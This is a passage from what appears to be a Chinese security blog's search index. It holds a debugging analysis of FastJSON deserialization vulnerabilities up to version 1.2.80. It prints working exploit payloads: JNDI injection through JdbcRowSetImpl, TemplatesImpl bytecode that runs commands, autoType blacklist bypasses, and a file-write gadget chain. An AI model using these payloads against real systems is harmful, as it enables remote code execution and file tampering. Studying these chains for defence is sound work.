<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>FastJSON(全系漏洞分析-截至2023/03/25)</title>
    <url>/2023/03/25/FastJSON/</url>
    <content><![CDATA[<h1 id="FastJSON-全系漏洞分析-截至2023-x2F-03-x2F-25"><a href="#FastJSON-全系漏洞分析-截至2023-x2F-03-x2F-25" class="headerlink" title="FastJSON(全系漏洞分析-截至2023&#x2F;03&#x2F;25)"></a>FastJSON(全系漏洞分析-截至2023&#x2F;03&#x2F;25)</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>FastJSON也不是什么新奇玩意了，之前都是看别的师傅的分析文章，也没有自己手动调试过，纸上学来终觉浅；这次决定自己手动调试一下，跟踪一下各个利用链以及原理；</p>
<p>全文一共7407个字，建议慢慢看；</p>
<p>截至到目前，FastJSON&gt;&#x3D;1.2.83还未有新的漏洞，所以我的分析聚集在1.2.80及以下；</p>
<p>使用的POC来自：<a href="https://github.com/safe6Sec/ShiroAndFastJson">https://github.com/safe6Sec/ShiroAndFastJson</a></p>
<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>FastJSON可以使用@type属性将JSON字符串转化为指定的类，例如</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.zeanhike.User&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="string">&quot;zhangsan&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;age&quot;</span><span class="punctuation">:</span><span class="number">18</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//在JSON字符串中已指定@type属性</span></span><br><span class="line">JSON.parse(s1) <span class="comment">//获得User类型的对象</span></span><br><span class="line">JSON.parseObject(s1)  <span class="comment">//获得JSONObject类型的对象</span></span><br><span class="line">JSON.parseObject(s1,Object.class) <span class="comment">//获得User类型的对象</span></span><br></pre></td></tr></table></figure>

<p>当JSON字符串转换成对象时，如果setter方法满足如下条件，会调用setter方法为对象的属性赋值</p>
<ul>
<li>方法名长度大于4</li>
<li>非静态方法</li>
<li>返回值为void或者当前类</li>
<li>以set开头且第四个字母为大写</li>
<li>参数个数为1个</li>
</ul>
<p>当不满足如上条件之一时，但是getter方法满足如下条件时，会调用getter方法</p>
<ul>
<li><p>方法名长度大于4</p>
</li>
<li><p>非静态方法</p>
</li>
<li><p>以get开头且第四个字母为大写</p>
</li>
<li><p>无参数传入</p>
</li>
<li><p>返回值类型继承自Collection Map AtomicBoolean AtomicInteger AtomicLong</p>
</li>
<li><p>此属性没有setter方法</p>
</li>
</ul>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303171158290.png" alt="image-20230317115819095"></p>
<p>使用ASM动态生成一个专门的类为属性赋值</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303171201662.png" alt="image-20230317120124488"></p>
<p>Fastjson还有以下功能点：</p>
<ol>
<li>如果目标类中私有变量没有setter方法，但是在反序列化时仍想给这个变量赋值，则需要使用<code>Feature.SupportNonPublicField</code>参数</li>
<li>fastjson 在为类属性寻找getter&#x2F;setter方法时，调用函数<code>com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#smartMatch()</code>方法，会忽略<code>_ -</code>字符串</li>
<li>fastjson 在反序列化时，如果Field类型为byte[]，将会调用<code>com.alibaba.fastjson.parser.JSONScanner#bytesValue</code>进行base64解码，在序列化时也会进行base64编码</li>
</ol>
<h2 id="fastjson-lt-x3D-1-2-24"><a href="#fastjson-lt-x3D-1-2-24" class="headerlink" title="fastjson&lt;&#x3D;1.2.24"></a>fastjson&lt;&#x3D;1.2.24</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">com.sun.rowset.JdbcRowSetImpl</span><br><span class="line">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><br></pre></td></tr></table></figure>

<h3 id="com-sun-rowset-JdbcRowSetImpl"><a href="#com-sun-rowset-JdbcRowSetImpl" class="headerlink" title="com.sun.rowset.JdbcRowSetImpl"></a>com.sun.rowset.JdbcRowSetImpl</h3><p>payload：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">	<span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;rmi://127.0.0.1:1097/Object&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>先调用setDataSourceName为父类BaseRowSet的dataSource属性赋值</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303171626423.png" alt="image-20230317162601375"></p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303171628252.png" alt="image-20230317162806198"></p>
<p>然后调用setAutoCommit为autoCommit赋值</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303171629615.png" alt="image-20230317162907578"></p>
<p>在赋值过程中，调用了connect方法</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303171630021.png" alt="image-20230317163012929"></p>
<p>在connect方法中获取dataSourceName属性的值，进行lookup，造成JNDI注入</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303171633305.png" alt="image-20230317163301064"></p>
<h3 id="com-sun-org-apache-xalan-internal-xsltc-trax-TemplatesImpl"><a href="#com-sun-org-apache-xalan-internal-xsltc-trax-TemplatesImpl" class="headerlink" title="com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"></a>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</h3><p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;,&quot;_bytecodes&quot;:[&quot;yv66vgAAADQAJAoAAwAPBwARBwASAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAR0ZXN0AQAMSW5uZXJDbGFzc2VzAQAiTGNvbS9oZWxsby9kZW1vL2pzb24vSkRLN3UyMSR0ZXN0OwEAClNvdXJjZUZpbGUBAAxKREs3dTIxLmphdmEMAAQABQcAEwEAIGNvbS9oZWxsby9kZW1vL2pzb24vSkRLN3UyMSR0ZXN0AQAQamF2YS9sYW5nL09iamVjdAEAG2NvbS9oZWxsby9kZW1vL2pzb24vSkRLN3UyMQEACDxjbGluaXQ+AQARamF2YS9sYW5nL1J1bnRpbWUHABUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7DAAXABgKABYAGQEABGNhbGMIABsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAAdAB4KABYAHwEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQHACEKACIADwAhAAIAIgAAAAAAAgABAAQABQABAAYAAAAvAAEAAQAAAAUqtwAjsQAAAAIABwAAAAYAAQAAACoACAAAAAwAAQAAAAUACQAMAAAACAAUAAUAAQAGAAAAFgACAAAAAAAKuAAaEhy2ACBXsQAAAAAAAgANAAAAAgAOAAsAAAAKAAEAAgAQAAoACQ==&quot;],&#x27;_name&#x27;:&#x27;exp&#x27;,&#x27;_tfactory&#x27;:&#123; &#125;,&quot;_outputProperties&quot;:&#123; &#125;&#125;</span><br></pre></td></tr></table></figure>

<p>会先为TemplatesImpl对象的属性进行赋值，由于这些属性都没有setter方法，但是开启了Feature.SupportNonPublicField特性，就可以成功赋值而不需要setter方法，由于<code>_outputProperties</code>这个属性有getter方法，且满足之前说的特性，所以当设置完所有属性的值后，会调用它的getter方法，也就是getOutputProperties</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303191427939.png" alt="image-20230319142716204"></p>
<p>跟进newTransformer()</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303191428375.png" alt="image-20230319142840293"></p>
<p>跟进getTransletInstancew()</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303191431403.png" alt="image-20230319143042245"></p>
<p><code>_name</code>不为空且<code>_class</code>为空，才会进入defineTransletClasses()</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303191432215.png" alt="image-20230319143243137"></p>
<p>在defineTransletClasses()方法中，首先<code>_tfactory</code>属性不能为空，否则会造成空指针异常，同时在后面将二维数组<code>_bytecode</code>属性转化为Class对象，同时存入一维数组<code>_class</code>属性中，同时有一个细节就是我们构造的恶意类父类要为<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code>，不然这个索引不会更新当前位置</p>
<p>然后回到getTransletInstance()方法</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303191436834.png" alt="image-20230319143647787"></p>
<p>这里根据<code>_class</code>属性以及当前索引获取当前Class对象，并拿到无参构造器进行实例化，可以将恶意代码放在无参构造函数或者静态代码块中，这样实例化时就会触发命令执行等操作从而RCE</p>
<h2 id="1-2-25-lt-x3D-fastjson-lt-x3D-1-2-41"><a href="#1-2-25-lt-x3D-fastjson-lt-x3D-1-2-41" class="headerlink" title="1.2.25&lt;&#x3D;fastjson&lt;&#x3D;1.2.41"></a>1.2.25&lt;&#x3D;fastjson&lt;&#x3D;1.2.41</h2><p>在1.2.25版本及以上，在ParserConfig中新增了黑白名单，同时存在一个autoTypeSupport属性用来设置是否支持反序列化，同时多了个checkAutoType方法用来检测非法操作；</p>
<p>在DefaultJSONParser中的parseObject方法中，调用了ParserConfig的checkAutoType进行校验并加载类</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303191519971.png" alt="image-20230319151925906"></p>
<p>在ParserConfig的checkAutoType方法中传入我们指定的类</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303191523399.png" alt="image-20230319152329345"></p>
<p>这里会判断autoTypeSupport属性的值，所以我们看看默认的autoTypeSupport属性的值</p>
<p>由于在new一个ParserConfig时，会设置autoTypeSupport属性还有denyList(黑名单)、acceptList(白名单)</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303191524114.png" alt="image-20230319152442045"></p>
<p>而这里autoTypeSupport被赋值成AUTO_SUPPORT</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303191532034.png" alt="image-20230319153255966"></p>
<p>而AUTO_SUPPORT在类实例化时，默认为false</p>
<p>这里会到checkAutoType方法</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303191523399.png" alt="image-20230319152329345"></p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303191603950.png" alt="image-20230319160335887"></p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303191657725.png" alt="image-20230319165752685"></p>
<p>传递的两个参数，第一个为反序列化的类，第二个为null</p>
<p>然后进行如下操作：</p>
<ol>
<li>autoTypeSupport为false，从缓存中找是否有该类的Class，找不到再从Map中找到该类的ObjectDeserializer</li>
<li>然后进行黑白名单匹配</li>
<li>最后抛出JSONException异常，<code>autoType is not support.</code>~</li>
</ol>
<p>若是autoTypeSupport属性为true，进行如下操作：</p>
<ol>
<li>进行黑白名单匹配</li>
<li>从缓存中找是否有该类的Class，找不到再从Map中找到该类的ObjectDeserializer</li>
<li>然后调用<code>TypeUtils.loadClass(typeName, this.defaultClassLoader);</code>加载这个类</li>
</ol>
<p>这里进入<code>TypeUtils.loadClass(typeName, this.defaultClassLoader)</code>中</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303191704283.png" alt="image-20230319170432225"></p>
<p>这里如果className是以<code>[</code>开头或者<code>L</code>开头<code>;</code>结尾，就会截取中间部分，去除这些符号</p>
<p>所以这里可以绕过黑白名单限制，当设置了autoTypeSupport属性为true时，我们可以往@type指定的类前面加<code>[</code>或者<code>L</code>开头<code>;</code>结尾进行黑白名单绕过</p>
<h2 id="fastjson-x3D-1-2-42"><a href="#fastjson-x3D-1-2-42" class="headerlink" title="fastjson&#x3D;1.2.42"></a>fastjson&#x3D;1.2.42</h2><p>1.2.42版本将黑名单变成hashcode</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303191717325.png" alt="image-20230319171720271"></p>
<p>而在checkAutoType中</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303191721993.png" alt="image-20230319172133927"></p>
<p>会对<code>L</code>开头<code>;</code>结尾的className先进行去除，然后在使用<code>TypeUtils.loadClass(typeName, this.defaultClassLoader)</code>加载类</p>
<p>这里双写L和;即可绕过</p>
<h2 id="fastjson-x3D-1-2-43"><a href="#fastjson-x3D-1-2-43" class="headerlink" title="fastjson&#x3D;1.2.43"></a>fastjson&#x3D;1.2.43</h2><p>同样在checkAutoType中，判断前两个字符不能为L，否则抛异常，可以使用<code>[</code>绕过</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303191815346.png" alt="image-20230319181504277"></p>
<p>payload比较特别：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;@type&quot;:&quot;[com.sun.rowset.JdbcRowSetImpl&quot;[,</span><br><span class="line">    &#123;&quot;dataSourceName&quot;:&quot;rmi://127.0.0.1:1097/Object&quot;,</span><br><span class="line">    &quot;autoCommit&quot;:true</span><br><span class="line">&#125;</span><br><span class="line">@type后紧跟[代表数组，以&#123;开头表示数组中的一个元素，多少个&#123;表示数组有多少个元素，例如：</span><br><span class="line">&#123;</span><br><span class="line">    &quot;@type&quot;:&quot;[com.sun.rowset.JdbcRowSetImpl&quot;[,</span><br><span class="line">    &#123;&quot;dataSourceName&quot;:&quot;rmi://127.0.0.1:1097/Object&quot;,</span><br><span class="line">    &quot;autoCommit&quot;:true,&#123;xxx,&#123;xxx</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="1-2-44-lt-x3D-fastjson-lt-x3D-1-2-45"><a href="#1-2-44-lt-x3D-fastjson-lt-x3D-1-2-45" class="headerlink" title="1.2.44&lt;&#x3D;fastjson&lt;&#x3D;1.2.45"></a>1.2.44&lt;&#x3D;fastjson&lt;&#x3D;1.2.45</h2><p>在1.2.44中修改<code>[</code>符号产生的绕过</p>
<p>不过依然可以使用黑名单不存在的类进行绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;@type&quot;:&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;,</span><br><span class="line">    &quot;properties&quot;:&#123;</span><br><span class="line">        &quot;data_source&quot;:&quot;ldap://127.0.0.1:23457/Command8&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个需要依赖mybatis框架</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">  &lt;groupId&gt;org.mybatis&lt;/groupId&gt;</span><br><span class="line">  &lt;artifactId&gt;mybatis&lt;/artifactId&gt;</span><br><span class="line">  &lt;version&gt;3.5.11&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<h2 id="fastjson-lt-x3D-1-2-47"><a href="#fastjson-lt-x3D-1-2-47" class="headerlink" title="fastjson&lt;&#x3D;1.2.47"></a>fastjson&lt;&#x3D;1.2.47</h2><p>可以在不开启autoTypeSupport且绕过黑白名单的情况下进行RCE，在checkAutoType方法中，若没有开启autoTypeSupport则会走到这里</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303191847971.png" alt="image-20230319184729891"></p>
<p>从两个地方取，如果取的到就返回</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303191847542.png" alt="image-20230319184756481"></p>
<p>这里可以通过往TypeUtils的缓存中存入我们的类</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303192149626.png" alt="image-20230319214933555"></p>
<p>而在TypeUtils中的loadClass可以存入缓存，而在MiscCodec的deserialze中会调用TypeUtils中的loadClass进行类加载并存入缓存</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303192150237.png" alt="image-20230319215048163"></p>
<p>这里重点是strVal，strVal是我们存入的缓存类，然后往上翻</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303192154943.png" alt="image-20230319215422887"></p>
<p>strVal来源于objVal，objVal来源于parser.parse，同时这里有个细节就是lexer.stringVal解析到的JSON键必须为val不然会抛出错误，然后parser.parse就是拿到JSON的值，所以可以指定键为val，值为com.sun.rowset.JdbcRowSetImpl，这样就会将com.sun.rowset.JdbcRowSetImpl加入缓存中</p>
<p>所以什么时候会调用MiscCodec的deserialze方法呢？</p>
<p>在DefaultJSONParser的parseObject会调用</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303192210430.png" alt="image-20230319221002297"></p>
<p>这里根据clazz从ParserConfig中取deserializer</p>
<p>ParserConfig中有一个deserializers属性，专门用来存deserializer</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303192211889.png" alt="image-20230319221113817"></p>
<p>在ParserConfig的initDeserializers会初始化这个属性，往里面存一些Class和对应的deserializer</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303192213389.png" alt="image-20230319221304293"></p>
<p>这里会存入MiscCodec，它对应Class类型</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303192213658.png" alt="image-20230319221345590"></p>
<p>所以回到DefaultJSONParser的parseObject中</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303192210430.png" alt="image-20230319221002297"></p>
<p>当clazz为Class时，会获取Class对应的deserializer，也就是MiscCodec，调用它的deserialize方法，这个clazz可以通过@type进行设定</p>
<p>最后的payload如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;@type&quot;: &quot;java.lang.Class&quot;,</span><br><span class="line">        &quot;val&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;@type&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;: &quot;rmi://127.0.0.1:1097/Object&quot;,</span><br><span class="line">        &quot;autoCommit&quot;: true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里传递的JSON字符串存在两个对象，第一个对象用来将指定类存入缓存中，第二个对象用来触发JNDI注入</p>
<h2 id="1-2-48-lt-x3D-fastjson-lt-x3D-1-2-68"><a href="#1-2-48-lt-x3D-fastjson-lt-x3D-1-2-68" class="headerlink" title="1.2.48&lt;&#x3D;fastjson&lt;&#x3D;1.2.68"></a>1.2.48&lt;&#x3D;fastjson&lt;&#x3D;1.2.68</h2><p>在MiscCodec的deserialze中将cache设置成false，不允许存入缓存</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303200948379.png" alt="image-20230320094837158"></p>
<p>但是也产生了新型绕过</p>
<p>在ParserConfig的checkAutoType中，利用expectClass绕过</p>
<p>这里看看</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303201411421.png" alt="image-20230320141109164"></p>
<p>首先expectClass不能为null，且不能等于Object、Serializable、Cloneable、Closeable、EventListener、Iterable、Collection，才会将expectClassFlag设置成true</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303201414149.png" alt="image-20230320141449066"></p>
<p>其次，在未开启autoTypeSupport的情况下，会匹配黑白名单，所以不能跟黑名单里的类相同</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303201420581.png" alt="image-20230320142010507"></p>
<p>expectClassFlag为true后，会根据typeName使用TypeUtils的loadClass去加载类，后面若clazz是expectClass的子类就放入huan’c返回</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303201422594.png" alt="image-20230320142238559"></p>
<p>也就是说这里typeName要为expectClass的子类，才能绕过checkAutoType的检测，同时绕过autoTypeSupport的限制</p>
<p>而只有两处地方，会调用checkAutoType且传递expectClass参数</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303201428497.png" alt="image-20230320142810418"></p>
<p>一个在ThrowableDeserializer的deserialize中</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303201430713.png" alt="image-20230320143004616"></p>
<p>另一个在JavaBeanDeserializer的deserialize中</p>
<p>先看ThrowableDeserializer的deserialize，在checkAutoType调用完后并返回class后</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303201431858.png" alt="image-20230320143151810"></p>
<p>在下面会直接创建实例</p>
<p>而在JavaBeanDeserializer的deserialize中</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303201433278.png" alt="image-20230320143357189"></p>
<p>调用完checkAutoType得到userType后，会获取userType对应的deserializer，然后调用deserialize方法，触发userType的反序列化，执行setter或getter方法</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303201444419.png" alt="image-20230320144417368"></p>
<p>网上公开的poc：</p>
<p>这个使用了JavaBeanDeserializer那条链，但是我在jdk8下复现失败</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303201509418.png" alt="image-20230320150920343"></p>
<p>这是因为fastjson在通过带参构造函数进行反序列化时，会检查参数是否有参数名信息，只有含有参数名信息的带参构造函数才会被认可</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303201510054.png" alt="img"></p>
<p>而我用的Windows下，Oracle JDK8的MarshalOutputStream类，不含有LocalVariableTable</p>
<p>由于大部分 JDK&#x2F;JRE 环境的类字节码里都不含有 LocalVariableTable，而很多第三方库里的字节码是有 LocalVariableTable 的。</p>
<p>浅蓝发的1.2.68利用第三方gadget写文件</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;stream&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.eclipse.core.internal.localstore.SafeFileOutputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;targetPath&quot;</span><span class="punctuation">:</span> <span class="string">&quot;d:/test/pwn.txt&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;tempPath&quot;</span><span class="punctuation">:</span> <span class="string">&quot;d:/test/test.txt&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;writer&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.esotericsoftware.kryo.io.Output&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;buffer&quot;</span><span class="punctuation">:</span> <span class="string">&quot;YjF1M3I=&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;outputStream&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$.stream&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;position&quot;</span><span class="punctuation">:</span> <span class="number">5</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;close&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.sleepycat.bind.serial.SerialOutput&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;out&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$.writer&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>依赖的jar包有点多</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">  &lt;groupId&gt;org.aspectj&lt;/groupId&gt;</span><br><span class="line">  &lt;artifactId&gt;aspectjtools&lt;/artifactId&gt;</span><br><span class="line">  &lt;version&gt;1.9.5&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">  &lt;groupId&gt;com.esotericsoftware&lt;/groupId&gt;</span><br><span class="line">  &lt;artifactId&gt;kryo&lt;/artifactId&gt;</span><br><span class="line">  &lt;version&gt;4.0.0&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">  &lt;groupId&gt;com.sleepycat&lt;/groupId&gt;</span><br><span class="line">  &lt;artifactId&gt;je&lt;/artifactId&gt;</span><br><span class="line">  &lt;version&gt;5.0.73&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<p>这里有个细节，就是在一些属性下使用了$ref，例如outputStream属性下，键$ref，值为$.stream，代表为outputStream属性赋值为stream对象；</p>
<p>首先调用SafeFileOutputStream的带参构造函数，然后调用Output的无参构造函数，使用setter为属性赋值，最后调用SerialOutput的构造函数</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303201834133.png" alt="image-20230320183429036"></p>
<p>这里的out为Output，进入super中</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303201836357.png" alt="image-20230320183642290"></p>
<p>包装out成BlockDataOutputStream，然后调用setBlockDataMode</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303201837250.png" alt="image-20230320183725191"></p>
<p>然后调用drain</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303201837373.png" alt="image-20230320183757318"></p>
<p>进行数据写入</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303201838909.png" alt="image-20230320183833865"></p>
<p>继续传递</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303201838396.png" alt="image-20230320183857315"></p>
<p>写完数据调用require方法</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303201839487.png" alt="image-20230320183945436"></p>
<p>进入this.flush()</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303201840881.png" alt="image-20230320184050810"></p>
<p>调用SafeFileOutputStream进行写，此时才是真正写到文件，写完调用flush关闭</p>
<p>MarshalOutputStream进行文件读写跟这个调用链差不多</p>
<h3 id="使用commons-io库"><a href="#使用commons-io库" class="headerlink" title="使用commons-io库"></a>使用commons-io库</h3><p>这也是使用了JavaBeanDeserializer那条链</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.commons.io.input.XmlStreamReader&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;is&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.commons.io.input.TeeInputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;input&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span 